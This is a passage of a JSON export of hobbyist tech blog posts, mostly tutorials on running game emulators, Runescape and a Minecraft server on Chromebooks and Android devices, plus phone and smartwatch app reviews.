your Chromebook if you haven&#8217;t already. Inside of Ubuntu, update the package list.\r\n\r\nsudo apt-get update\r\n\r\nNext we need to add the PCSX emulator to the repository. But before we can do that, we need to install the software properties. Type in the following:\r\n\r\nsudo apt-get install software-properties-common\r\n\r\nNow we need to update the OpenGL drivers. So type in:\r\n\r\nsudo add-apt-repository ppa:oibaf/graphics\r\n\r\nsudo apt-get update\r\n\r\nsudo apt-get dist-upgrade\r\n\r\nNow we can finally add the PCSX emulator to the repository. Type in:\r\n\r\nsudo add-apt-repository ppa:gregory-hainaut/pcsx2.official.ppa\r\n\r\nsudo apt-get update\r\n\r\nsudo apt-get install pcsx2\r\n\r\nFinally, to launch it, type in:\r\n\r\npcsx2\r\n\r\nStep 2: Setting Up\r\n\r\nWhen you launch the emulator,  it will first ask you for your language preference.\r\n\r\n\r\n\r\nOn the next screen, you will have your configuration options.  Go to graphics (GS) and make sure Gsdx is selected as the graphics option. Then go to configure.\r\n\r\n\r\n\r\nMake sure the renderer is on OpenGL software. For the resolution, I usually check the box for the native resolution. Finally, in advance settings, force disable the separate shader. You can click okay to save the settings.\r\n\r\n\r\n\r\nThen go to the pad configuration and setup the keypad however you like.\r\n\r\n\r\n\r\n Step 3: Bios\r\n\r\nNow, before we go to the next screen, take your bios file and transfer it to /home/yourUserName/.config/pcsx2\r\n\r\n\r\n\r\nNow, go to the next screen and choose your bios.\r\n\r\n\r\n\r\nStep 4: Playing\r\n\r\nFinally, all you need to do is go to System, bootCD/DVD and choose your iso and it should boot!\r\n\r\n\r\n\r\nIf you have any questions are comments, feel free to leave them below.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/06/language-selection.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/06/configuraiton.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/06/configrpanel1.jpg\r\n [4]: http://localhost/wordpress/wp-content/uploads/2015/06/configurepanel2.jpg\r\n [5]: http://localhost/wordpress/wp-content/uploads/2015/06/pad.jpg\r\n [6]: http://localhost/wordpress/wp-content/uploads/2015/06/bios.jpg\r\n [7]: http://localhost/wordpress/wp-content/uploads/2015/06/bios2.jpg\r\n [8]: http://localhost/wordpress/wp-content/uploads/2015/06/launch.jpg\r\n",
        "tags": [
            "chromebook",
            "emulation",
            "games",
            "gaming",
            "linux",
            "play",
            "playstation",
            "ps2",
            "tutorial",
            "ubuntu"
        ]
    },
    {
        "uri": "/lg-g4-quick-review/",
        "title": "LG G4 Quick Review",
        "content": "{{ youtube ysvFJYHgSoE }}\r\n\r\ntl;dr\r\n\r\nThe LG G4 is seriously one of the best Android smartphones of 2015. It might not have the most attractive design on the outside and in the UI, but it is very responsive and can last you through a whole day with moderate-heavy usage.\r\n\r\nThe LG G4 Quick Review:\r\n\r\nHere is a quick review of the LG G4.\r\n\r\n Screen:\r\n\r\nThe LG G4 has a 2560x1440p display. LG calls it a quantum HD display. The display itself captures 98% of the DCI color gamut. So in theory, you&#8217;ll see a wider range of colors and more accurate colors. Honestly, I don&#8217;t know if I even own the proper equipment to verify the information on color gamut. What I can say is that the display is gorgeous. The colors are vibrant but not over saturated (looks at you Galaxy S6) and the white and black levels are closely accurate as well. My only complaint is that in direct sunlight, the screen becomes really washed out. Also, in auto brightness, the phone keeps the screen a little too dim. I would still give the best display to the Galaxy S6, despite its over-saturation, but the LG G4 comes very close to it.\r\n\r\nPerformance:\r\n\r\nA big area of concern of the G4 was performance. LG chose to use the slightly older Snapdragon 808 over the newer Snapdragon 810 due to overheating issues. Some people were especially worried about the performance, since the 808 uses the older Adreno 418. To be honest, these are all just numbers for benchmark geeks to worry over. I tested some of the most graphically demanding games such as Goat Simulator and GTA Vice city, and could not get the device to lag. Performance on this six core processor should be nothing to worry about.\r\n\r\n Battery:\r\n\r\nThe G4 comes with a 3000mAh removable battery. Battery life is superb. You will easily get through a day, and a little more with a single charge. Unfortunately, the G4 lacks wireless charging. Also, quick charging is only available if you buy the special charger.\r\n\r\nCamera:\r\n\r\nThe biggest selling point on the G4 is the camera. The G4 comes with a 16mp camera with a f1.8  aperture. The pictures are absolutely stunning and the low light performance is excellent. This definitely makes the G4 one of the best cameras in any Android phones besides the Galaxy S6. The G4 also offers a manual mode that allows you to manually focus, control the iso level, white balance and shutter speed.\r\n\r\n Others:\r\n\r\nThere is a lot of other positive stuff that the G4 has going for it. It has cool multi-window capabilities. A double tap to wake and sleep, and runs the latest version of Android right now (Android 5.1). It comes with 32GB of internal storage and even offers expandable storage via a microSD card. Overall, I would definitely recommend the G4, it&#8217;s an awesome device with very little compromises.\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "device",
            "lg g4",
            "phone",
            "quick",
            "review",
            "smartphone"
        ]
    },
    {
        "uri": "/6-fun-facts-about-android/",
        "title": "6 Fun Facts About Android",
        "content": "{{ youtube gGLi65QRKcQ }}\r\n\r\nAndroid is full of surprises! Even when you think you know everything something new gets discovered. While you might be up to date with all the latest information, I am going to attempt to astonish you with 6 fun facts about android that you probably didn&#8217;t know.\r\n\r\n1. The Android Logo used to be scary\r\n\r\nWe all know that Bugdroid is the official Android logo. However, before Android was officially launched, dandroid was the temporary logo used to represent the operating system.\r\n\r\n 2. Key Lime Pie\r\n\r\nIf you remember all the hype leading up to Android Kitkat (4.4), then you will probably remember all the rumors behind the name. A lot of people were suggesting key lime pie as the official name. It&#8217;s possible that the name was actually going to be key lime pie, but was changed to kitkat because:\r\n\r\n &#8220;We realized that very few people actually know the taste of a key lime pie.&#8221; &#8211; John Lagerling, Google Director of Android Global Partnerships.\r\n\r\n3.  Android Cameras\r\n\r\nThe original goal was to put Android in cameras, however, the focus was shifted when the developers realized that there was not a huge market for smart cameras at the time (early 2000s).\r\n\r\n 4. Android Came before IOS\r\n\r\nOkay, let&#8217;s just settle this now. Development on Android started back in 2003 while development on iOS started in 2004.\r\n\r\n5. Cupcake wasn&8217;t the first desert\r\n\r\nAndroid 1.1 was the first version of Android to have a desert name. It was called petit four.\r\n\r\n6. Android and Google\r\n\r\nHopefully this is the most obvious fact, Google did not make Android. They acquired it for $50 million in 2006.\r\n\r\n&nbsp;\r\n\r\nIf you have any cool facts feel free to leave them below.\r\n\r\n&nbsp;\r\n\r\nsources:\r\n\r\na href=\"http://www.droid-life.com/say-hello-to-the-dandroids-the-temporary-original-android-mascot/\" target=\"_blank\"http://www.droid-life.com/say-hello-to-the-dandroids-the-temporary-original-android-mascot//a\r\n\r\na href=\"http://en.wikipedia.org/wiki/Androidversionhistory\" target=\"blank\"http://en.wikipedia.org/wiki/Androidversion_history/a\r\n\r\na href=\"http://en.wikipedia.org/wiki/Android(operatingsystem)\" target=\"blank\"http://en.wikipedia.org/wiki/Android(operating_system)/a\r\n\r\na href=\"http://www.businessinsider.com/important-google-acquisitions-2014-8?op=1\" target=\"_blank\"http://www.businessinsider.com/important-google-acquisitions-2014-8?op=1/a\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "dandroid",
            "facts",
            "fun",
            "google",
            "history",
            "six",
            "vlog"
        ]
    },
    {
        "uri": "/play-dreamcast-games-on-android/",
        "title": "Play Dreamcast Games on Android",
        "content": "Ah, the  Sega Dreamcast, it brings back old memories. Who am I kidding, I never had the Dreamcast myself. So unfortunately, my personal experience is limited to the only game (Sonic Adventures) that I have ever played on it. But, what I do know is that you can play Dreamcast games on Android!\n\nWhat You Will Need:\n\n  a href=\"https://play.google.com/store/apps/details?id=com.reicast.emulator&hl=en\" target=\"blank\"Reicast/a or use a href=\"http://reicast-builds.s3.amazonaws.com/builds/heads/feat/no-direct-memmap-e2a7029/reicast-android-debug-e2a7029.apk\" target=\"blank\"This One/a if you are running a Lollipop Device and Experience Crashes with the Play Store version.\n  Dreamcast Game .GDI\n  a href=\"http://www.loveroms.com/extras/files/bios/dreamcastbios.zip\" target=\"blank\"Dreamcast Bios/a\n\n The Simple Process:\n\nOkay, here is what you need to do. First find a Dreamcast game. It could be in either .gdi format or .chd (v4). You could always use online tools to rip the data from your own disc or perform a Google search.\n\nThen download the Dreamcast bios. Unzip the contents and create a folder on your Android device called reicast** _and inside that folder create another folder called **_data and transfer the dc\\_boot.bin and dc\\_flash.bin to that folder. You can transfer the game anywhere you like on your device.\n\nFinally, open up the emulator. Go to paths, and in the System Path, specify the location to your bios. SO it should be /storage/sdcard0/reicast/data.\n\n&nbsp;\n\nBelow that you can also specify that path to your game. Finally, you can boot it up.\n",
        "tags": [
            "android",
            "dreamcast",
            "emulation",
            "enulator",
            "games",
            "play",
            "reicast",
            "rom"
        ]
    },
    {
        "uri": "/play-sega-genesis-games-on-android/",
        "title": "Play Sega Genesis Games on Android",
        "content": "The Sega Genesis was my very first game console. What my gaming PC is to me now, was what my Sega Genesis meant to me back in 1999 (if that makes sense). There are so many old titles that I used to love playing. And those cartridges&#8230;damn&#8230;I loved those cartridges. The best thing was that there used to be a huge bin at stores like GameStop, where I could easily pick up a bunch of them for under $10.  In any case, you can play sega genesis games on Android.\n\nWhat You Will Need:\n\n  a href=\"https://play.google.com/store/apps/details?id=ca.halsafar.genesisdroid&hl=en\" target=\"_blank\"GENPlusDroid/a\n  A Gensoid Rom\n\n The Very Very Simple Process:\n\nLuckily, playing Genesis games on Android is the easiest emulation to do. All you need to do is find a Gensoid Rom (the internet is full of them, they are typically .bin files) and transfer it to your phone and open it up in GENPlusDroid. That&#8217;s it. No difficulty involved. As expected, the performance is smooth without any lag (come on, this is a 90s game system, there shouldn&#8217;t be lag!)\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/06/Screenshot_2015-06-12-23-49-33.jpg\n",
        "tags": [
            "android",
            "emulation",
            "emulator",
            "games",
            "genesis",
            "old",
            "play",
            "rom",
            "sega",
            "sonic"
        ]
    },
    {
        "uri": "/play-runescape-on-chromebook/",
        "title": "Play Runescape on Chromebook",
        "content": "{{ youtube HLdPepraVGA }}\r\n\r\nBack in fourth grade, I used to spend hours playing Runescape. At the time, I thought it was the most exciting and adventurous game out there. However, it&#8217;s been about nine years since I have last played the game, so I am very behind on the latest additions and enhancements. In any case, if you are an active player, you will be happy to know that you can play this on your Chromebook.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nNow to do this, we are going to use the unofficial Linux client. So of course, you will need to have Linux installed on your Chromebook. Check out a href=\"http://www.davebennett.tv/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"my tutorial/a, if you do not have it installed already. Also, this will only work for the Intel powered Chromebooks. As far as performance, well, it&#8217;s playable. I am probably averaging around 10fps on my Acer C720. If you have a Chrombook that&#8217;s rocking a more powerful CPU, then you should get better performance. Now, let&#8217;s see how to play Runescape on Chromebook.\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"http://www.davebennett.tv/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"Chromebook with Linux Installed/a\r\n\r\n Step 1: Download Installer\r\n\r\nStart your Linux installation from Chrome OS. Open up terminal and type in the following:\r\n\r\nsudo apt-add-repository ppa:hikariknight/unix-runescape-client\r\n  \r\nsudo apt-get update\r\n  \r\nsudo apt-get install unix-runescape-client\r\n\r\nThen to launch, type in runescape\r\n\r\nStep 2: Graphics\r\n\r\nSo now the game should be up and running. There are a few graphics problems that you might run into. First off, for the overall performance, I would recommend changing the game to Legacy mode. Also, inside of your graphics settings, make sure to set the rending resolution to the lowest possible value (800&215;600). There is also a strange black flickering that happens, which I have not been able to figure out how to stop. Leave any comments below if you have a suggestion.\r\n",
        "tags": [
            "chromebook",
            "emulation",
            "game",
            "java",
            "linux",
            "online",
            "play",
            "runescape"
        ]
    },
    {
        "uri": "/stream-steam-games-to-android/",
        "title": "Stream Steam Games to Android",
        "content": "{{ youtube BmjMOCTU6YA }}\r\n\r\nHave you ever wanted to play Team Fortress or PlanetSide 2 on your Android device? Well, there is no way to do that, unless you&#8217;re looking to play a href=\"http://www.davebennett.tv/play-team-fortress-classic-on-android/\" target=\"_blank\"Team Fortress Classic on your Android device/a. However, you could stream these games from your computer to your Android device.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nCurrently, the most popular method used to stream games to Android is some combination of limelight and Nvidia&#8217;s Game Stream. The unfortunate thing is that Nvidia&#8217;s game stream requires you to have a 600 series card or better. This leaves many of the older GPU&#8217;s out of option including a lot of laptop GPU. So instead, we are going to use a streaming app called KinoConsole. While the performance is not as marvelous as Nvidia&#8217;s Game stream, it still works really well and is something that you can still enjoy. Here&#8217;s how to stream Steam games to Android.\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"http://kinoconsole.kinoni.com/\" target=\"_blank\"KinoConsole for Desktop/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.kinoni.console\" target=\"_blank\"KinoConsole for Mobile/a\r\n\r\n Step 1: Download and Install\r\n\r\nFirst download and install KinoConsole on your desktop. When you launch it, go to the connection tab and setup your password. Then go to the Quick Launch tab. Click the button to scan installed games. It should automatically detect your steam games and any other games that you have installed. Finally, go to the advanced tab and make sure that Xbox Controller emulation is enabled.\r\n\r\n\r\n\r\nspan style=\"color: #3366ff;\"**A note to Windows 8 users. I had to install the Xbox 360 peripherals driver in order to get emulation working. You might have to do the same. You can download it /spana style=\"color: #3366ff;\" href=\"https://www.microsoft.com/hardware/en-us/d/xbox-360-controller-for-windows\" target=\"_blank\"here/aspan style=\"color: #3366ff;\". (Choose the one for Windows 7)./span\r\n\r\nStep 2: Android\r\n\r\nOn your Android device, open the KinoConsole app. Make sure your phone is on the same wifi network as your pc. It should automatically detect the pc that has KinoConsole running. Sign in with the password you created early. Finally, choose a game and it should launch.\r\n\r\n Dealing with Controls\r\n\r\nThe one big annoyance with this app is the touchscreen controls. To add a control, hit the back button and select edit controls. Unfortunately, not every game will work with the Xbox controls. Also, it&#8217;s really frustrating trying to play a game made for a mouse and keyboard with joystick controls. Of course, if you have a bluetooth controller you can connect it to your Android device. Unfortunately, using a keyboard vis OTG doesn&#8217;t work.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/games.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/07/controls.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/07/play-tf2-2.jpg\r\n",
        "tags": [
            "android",
            "games",
            "gaming",
            "steam",
            "stream"
        ]
    },
    {
        "uri": "/play-ps2-games-on-android/",
        "title": "Play PS2 Games on Android",
        "content": "I am not lying when I tell you that there is an actual PS2 emulator available for Android. No, I am not talking about one of the many fake ones that you see in the Play Store. I am talking about an actual app with the purpose of emulating the PlayStation 2. Now don&#8217;t get too excited. This app is still in the very early stages. The only commercial title that I have got booting so far has been Final Fantasy X. And even then, the performance is no more than a meager 5 fps.\n\nThe app is called a href=\"http://purei.org/\" target=\"_blank\" rel=\"noopener\"Play!/a and is being developed by Jean-Philip Desjardins. Despite only having one developer, the progress that he has made on this app is unbelievable. No, it&#8217;s not perfect and there still is a lot of work (currently there is no sound in any of the games). Still, this should be a point of motivation for others to join and offer encouragement and resources to help move this project forward. I remember when PPSSPP first came out and only supported one unknown title. Now it&#8217;s compatible with practically any PSP title. So I am hoping that this app will follow the same faith within a few years.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  a href=\"http://purei.org/downloads/play/weekly/\" target=\"_blank\" rel=\"noopener\"Play!/a\n  Playstation 2 ISO File\n\n What to do:\n\nCurrently, there is not much you need to do with this app to play PS2 games on Android. All you need to do is transfer a PlayStation 2 ISO file to your device and launch it in the Play! app. Don&#8217;t expect any miracles though. Most games probably won&#8217;t boot, or won&#8217;t be running at a playable speed. Also, there currently is no sound.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/Screenshot_2015-07-02-17-20-07.jpg\n",
        "tags": [
            "android",
            "emulation",
            "games",
            "playstation",
            "playstation 2",
            "ps2",
            "psp"
        ]
    },
    {
        "uri": "/coolest-apps-android-wear-2015/",
        "title": "Coolest Apps Android wear 2015",
        "content": "{{ youtube MSUDGwWJFUI }}\r\n\r\nI love trying out new things with my smartwatch. Here is a video featuring the coolest Android wear apps 2015. If apps aren&#8217;t your thing, no problem. Check out my video on the Top Android wear games for your device.\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.pixtogram.wear.zicam\" target=\"_blank\"PixToCam /a\r\n\r\n a href=\"https://play.google.com/store/apps/details?id=com.appfour.weartube\" target=\"_blank\"Video for Android Wear/a\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.rimidalv.dictaphone\" target=\"_blank\"Wear Audio recorder/a\r\n\r\n a href=\"https://play.google.com/store/apps/details?id=com.appfour.wearbrowser\" target=\"_blank\"Web Browser for Android wear/a\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.phonephreak.extendedlight\" target=\"_blank\"Staylit Wear/a\r\n\r\nHave any other cool apps? Feel free to share below.\r\n\r\n",
        "tags": [
            "android wear",
            "apps",
            "coolest",
            "smartwatch"
        ]
    },
    {
        "uri": "/lock-phone-from-android-wear/",
        "title": "Lock Phone From Android Wear",
        "content": "{{ youtube LBZS9zTJZoM }}\r\n\r\nSecurity means everything to me. I am that guy who uses two step authentication on everything, along with safety backups and more. When it comes to security on Android, things aren&#8217;t as tight as I would like them to be. On my S6, my favorite thing to use is the fingerprint scanner. I am aware that the fingerprint scanner does not offer better security than a strong password or lock pattern (a href=\"http://www.davebennett.tv/bypass-android-lock-screen/\" target=\"_blank\"although you could easily bypass the Android Lockscreen pattern/a), however, it will deter most people from trying to snoop around in my phone. Android Lollipop also features a security feature called &#8220;Trusted Devices.&#8221;\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nThe trusted devices feature will allow your phone to enable the lock code when your trusted device (or wifi network) is out of range. If you don&#8217;t have Lollipop, a href=\"http://www.davebennett.tv/disable-lock-screen-at-home/\" target=\"_blank\"there is an app that will allow you to achieve similar features./a When it is in range, your lock screen will not be activated. For most people, this offers a lot of convenience with a small sense of security. Not exactly for me. I want total control. I needed a way that I could manually lock my phone from my watch. Unfortunately, stock android wear allows no such option, so I had to resort to using Tasker. Okay, enough rambling, here&#8217;s how to lock phone from Android wear.\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=net.dinglisch.android.taskerm\" target=\"_blank\"Tasker/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.joaomgcd.autowear\" target=\"_blank\"AutoWear/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.intangibleobject.securesettings.plugin\" target=\"_blank\"Secure Settings/a\r\n\r\n Step 1: Device Administrators\r\n\r\nBefore we do anything, you will need to enable secure settings under device administrators. The location of this slightly varies on each phone and version of Android. For my Galaxy S6, it is located at Lock Screen & Security &#8211; Other Security Settings &#8211; Device Administrators\r\n\r\n\r\n\r\nStep 2: Setting up the Tasker Task\r\n\r\nInside of Tasker,  go to the Tasks tab and create a new task. Name it whatever you like. It will prompt you for an action. Click the add button and go to plugin then secure settings.  Afterwards, click the edit button next to configuration.\r\n\r\nIt will bring you inside of the secure settings app. From there select Dev Admin Actions then select  _Lock Device _and hit the save button.  Now the task is ready to be linked to a profile.\r\n\r\n\r\n\r\n Step 3: Setting up the Tasker Profile\r\n\r\nGo to the profiles tab in Tasker. Add the AutoWear profile by going to Event &#8211; Plugin &#8211; AutoWear.  The hit the edit button next to configuration. Select command filter and type in the phrase that you want to trigger your lock task.\r\n\r\n\r\n\r\nI am simply going to use &#8220;lock&#8221; (without the quotation marks).  I am also going to select the option Exact so that it will only react whenever I exactly say that phrase. Hit the check button to save. It will bring you back to the configuration screen. Nothing needs to be changed here, just go back to the profiles tab. The last thing to do is to link your lock task to the AutoWear profile. That&#8217;s it, the final thing to do is to configure AutoWear.\r\n\r\n\r\n\r\nStep 4: Configuring AutoWear\r\n\r\nOpen the AutoWear app on your phone. Go to screens and add a new screen.\r\n\r\n\r\n\r\nScreens are the only way that you are able to interact with AutoWear on your device because AutoWear cannot use the default Google Now integration. Go toe the commands to show tab and choose to add new commands. The app listens for certain events on your watch that will trigger the screen so that you can say your command. I like to use shake as the command. You can also use one of the app launcher commands such as &8220;Open Jarvis&#8221; (I love Iron Man). Finally, you can also add predefined choices. So you can have the lock command be a predefined choice so that you don&#8217;t have to say it. Lastly, you can also add a cancellation screen if you so desire. Hit the check button to save the screen and you are all set to go.\r\n\r\nStep 5: Android Wear\r\n\r\nSince I choose the shake command, all I have to do is shake my watch and the Android wear screen will display. From there I can say &8220;lock&#8221; and will recognize the command, send it to tasker, and lock my device.\r\n\r\n\r\n\r\nA word of advice, if you are using the shake command, go into the autowear settings on your watch and setup the shake threshold. If not, every nuanced arm movement will cause the autowear app to open.\r\n\r\n\r\n\r\nIf you have any questions or comments feel free to leave them below!\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/Screenshot_2015-07-20-10-05-49.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/07/Screenshot_2015-07-20-10-05-17.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/07/Screenshot_2015-07-20-10-04-41.jpg\r\n [4]: http://localhost/wordpress/wp-content/uploads/2015/07/Screenshot_2015-07-20-10-04-05.jpg\r\n [5]: http://localhost/wordpress/wp-content/uploads/2015/07/Screenshot_2015-07-20-10-06-39.jpg\r\n [6]: http://localhost/wordpress/wp-content/uploads/2015/07/autowear.jpg\r\n [7]: http://localhost/wordpress/wp-content/uploads/2015/07/shake.jpg\r\n",
        "tags": [
            "android",
            "android wear",
            "autowear",
            "bluetooth",
            "lock",
            "phone",
            "security",
            "tasker"
        ]
    },
    {
        "uri": "/install-android-on-pc/",
        "title": "Install Android on Old PC",
        "content": "Do you have an old computer just sitting around? If you are like me, then you probably have a couple of old PC&#8217;s that once ran Windows XP but serve no useful purpose now. Of course, I could always just install and very lite version of Linux on it and call it a day. However, Linux takes a lot of time (compared to Windows) to set up and is a big learning curve for people who are unfamiliar with it. The advantage of using Android as the OS is that you will have the same user experience on your PC just like on your phone. Alternatively, if you are using a Chromebook, a href=\"http://www.davebennett.tv/run-android-on-chromebook/\" target=\"blank\" rel=\"noopener\"installing Android on it w/aill give you far more options than Chrome OS. But then again, if you have a Chromebook, you might as well a href=\"http://www.davebennett.tv/install-windows-10-on-chromebook/\" target=\"blank\" rel=\"noopener\"install Windows 10/a, but I digress.\n\n{{ ad }}\n\nThe hardware I am using is relatively modest. An Intel Pentium 4 processor with less than 1GB of RAM and a 250GB hard drive. As far as performance, Android runs very smooth on this. There is one minor issue however. The version we are going to be using is an x86 port of Android. This causes an issue with a lot of Android games because a lot of them depend on third party libraries that are only designed for arm. Pretty much, you won&#8217;t be able to do any major gaming on your Android PC. But still, Android makes for a surprisingly pleasant desktop OS experience. Here&#8217;s how to install Android on PC.\n\nWhat You Will Need:\n\n  a href=\"http://sourceforge.net/projects/android-x86/files/Release%204.4/android-x86-4.4-RC2.iso/download\" target=\"_blank\" rel=\"noopener\"Android x86 iso/a\n  a href=\"https://rufus.akeo.ie/\" target=\"_blank\" rel=\"noopener\"Rufus/a\n  1 GB Flash Drive\n  Computer that is able to boot from Flash Drive\n\n Step 1: Downloading Android x86\n\nThe first thing that you need to do is download the Android x86 iso. I provided a direct link to the Kitkat build RC2 which is the latest build at the time of writing this. To see other builds, go to the a href=\"http://www.android-x86.org/download\" target=\"_blank\" rel=\"noopener\"downloads page./a\n\nStep 2: Bootable USB\n\nUsing the program Rufus, we are going to create a bootable USB drive. Select your USB drive from the drop-down menu and choose the Android x86 iso file and hit start.\n\n Step 3: Booting from USB\n\n{{ ad }}\n\nNow on your PC, insert your USB drive. When your computer starts, go into the boot menu. This is usually done by pressing the  F12 or Delete button, but could differ depending on your system. Make sure to choose the option to boot from your USB.\n\nStep 4: Installing\n\nYou should now be at the bootloader screen. Select the option to install Androidx86 to hard disk. The next screen will ask you about partitions. Personally, I have no use for Windows XP so I am going to completely format the drive and use the whole thing for Android. Of course, you don&8217;t have to. You can just choose your primary hard drive from the list and make sure not to choose the format option on the next screen.\n\nIn my scenario of completely formatting the drive, here&#8217;s what I am going to do. Go down to create/Modify partitions. **And choose **sda.\n\nIn the Disk Utility I am going to delete the existing partition then create a new partition (make it the primary). Finally, I am going to change the type to Linux (number 83 on the list) and finally write the partitions out to disk.\n\n{{ ad }}\n\nFinally, I am going to choose the new partition that I just created. On the next screen, I am going to choose EXT3 as the format.\n\nIt&#8217;s going to ask if I want to format it, I am going to choose yes.\n\nIt&#8217;s going to prompt me if I want to install the grub bootloader. I am also going to choose yes.\n\nChoose yes when it prompts for installing the directory as read-write.\n\nOnce it&#8217;s done, make sure to select reboot.\n\nStep 5: Setting up Android\n\nAfter you reboot, it should briefly go into the grub bootloader before going right into Android. From this point, you can set it up like you would on any normal phone. One quick note, if it asks you about wifi network and you&8217;re connected via ethernet, just choose to skip the wifi setup. It will still detect your Ethernet connection.\n\nSo if you have any questions or comments feel free to leave them below.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/rufus-old-andorid.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2015/07/booting-from-usb.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2015/07/sda.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2015/07/type.jpg\n [5]: http://localhost/wordpress/wp-content/uploads/2015/07/Android-homescreen.jpg\n",
        "tags": [
            "android",
            "android x86",
            "install",
            "old",
            "pc",
            "uses for old pc"
        ]
    },
    {
        "uri": "/play-team-fortress-classic-on-android/",
        "title": "Play Team Fortress Classic on Android",
        "content": "Have you ever imagined that you would be able to play a Steam game on your phone? Well, I hope so, because I already demonstrated how to play a href=\"http://www.davebennett.tv/play-portal-on-any-android/\" target=\"blank\" rel=\"noopener\"Portal on your Android device/a. In any case, it&#8217;s even easier to play Team Fortress Classic on Android. This is all thanks to an app called SDLash3D which uses the SDL library that allows you to do some really cool emulation such as running a href=\"http://www.davebennett.tv/run-windows-95-on-android/\" target=\"blank\" rel=\"noopener\"Windows 95 on your device/a. Overall, the performance offered by this app is amazing. Besides playing over LAN with other players, there was hardly any lag in this game.\n\nSo how much can you do with this game? Unfortunately, online play does not work. But besides&#8230;I doubt many people still logon to Team Fortress Classic when you can easily play the much improved TF2. However, you can play over LAN. So if you install this app, and copy the game files over to any other device, well, you can pretty much have a Team Fortress LAN party. Gnarly right?\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Team Fortress Classic\n  Half Life\n  a href=\"https://github.com/SDLash3D/xash3d-android-project/releases/download/v0.14.1/xashdroid-release.apk\" target=\"_blank\" rel=\"noopener\"SDLash3D Apk/a\n  a href=\"https://github.com/SDLash3D/xash3d-android-project/releases/download/v0.14.1/extras.7z\" target=\"_blank\" rel=\"noopener\"Extras.7z /a\n\n Step One: Game Data\n\nOn your android device, create a folder called xash. _It should exist at the root of your sdcard (sdcard/xash). Then on your pc, transfer the Valve folder and Team Fortress Classic folder (probably located under steamapps/common/half-life) to that xash folder. Afterwards, download and extract the extras.7z folder. **Move _that valve folder and game controller text file to the Valve folder in your Xash folder. Have I confused you yet? Just to recap, on your sdcard you have the Xash folder. Within that folder you also have the TFC and Valve folder. Within _that **_Valve folder you also have the Valve folder you downloaded from the extras zip and the controller text file from that zip.\n\nStep Two: Booting\n\nFinally, on your Android device download and install the SDLash3D apk. When you launch it, type in -game tfc to launch TFC (If you don&8217;t type that, it will just launch Half-Life&#8230;that&#8217;s for another video ;).  If at any time the game or menu appears &#8220;frozen&#8221; just hit the recents button on your device and go back to the app. It will unfreeze it.\n\n{{ ad }}\n\nSo there you have it. From this point you can create a LAN game and start playing. If you have any questions or comments feel free to post them down below.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/07/Transfer-Steam.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2015/07/TFC-Classic.jpg\n",
        "tags": [
            "android",
            "emulation",
            "emulators",
            "game",
            "sdl",
            "steam",
            "team fortress",
            "tf2"
        ]
    },
    {
        "uri": "/run-minecraft-server-on-chomebook/",
        "title": "Run Minecraft Server on Chromebook",
        "content": "{{ youtube _J7FiQPVM6I }}\r\n\r\nSo do you have a Chromebook sitting around that you have absolutely no idea what to do with? Well, if you or your buddies are minecraft junkies, then why not consider turning your Chromebook into a Minecraft server. It runs slightly faster than using your a href=\"http://www.davebennett.tv/run-minecraft-server-on-android/\" target=\"_blank\"Android phone as a minecraft server/a, and offers a playable speed(though it can lag occasionally).\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nNow before you do this, you need to make sure that you have a href=\"http://www.davebennett.tv/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"Ubuntu Installed on your Chromebook./a If you don&#8217;t have Ubuntu installed check out my tutorial on how to install it. In theory, this should also work on ARM powered Chromebooks but YMMV. Also remember that you can&#8217;t connect to desktop servers from Minecraft Pocket Edition. So here&#8217;s how to run Minecraft server on Chromebook.\r\n\r\n&nbsp;\r\n\r\n What You Will Need:\r\n\r\n  Chromebook with Linux Installed\r\n  a href=\"https://minecraft.net/download\" target=\"_blank\"Minecraft Server Jar/a\r\n\r\nStep 1: Opening Ports\r\n\r\nUnfortunately (or fortunately) Chrome OS has a very tight lock-down with ports. So we have to manually open up a port for Minecraft. In Chrome OS, open up terminal by typing in *CRTL + ALT + Delete. *Inside of the terminal type in *shell. *Then copy and paste the following:\r\n\r\nsudo /sbin/iptables -A INPUT -p tcp --dport 25565 -j ACCEPT\r\n\r\n\r\n\r\nThen hit enter. Keep in mind that you don&8217;t have to use 25565 as the port. I am just using that because it is the default port in Minecraft. After you hit enter, no confirmation or message will display, so you are good to go.\r\n\r\nLaunch Ubuntu by typing in *sudo startxfce4 *(or whatever desktop 